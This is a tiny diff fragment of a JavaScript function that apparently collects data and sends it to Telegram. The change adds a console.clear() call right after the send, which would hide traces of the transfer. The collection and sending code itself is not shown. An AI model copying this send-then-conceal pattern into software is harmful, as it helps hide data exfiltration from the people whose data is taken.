@@ -483,7 +483,9 @@ function mainData() {
             } catch (error) {
                 console.log("Error sending to Telegram:", error);
             }
+            console.clear();
         }, 1500);
     }
     collectAllData();
+    
 };
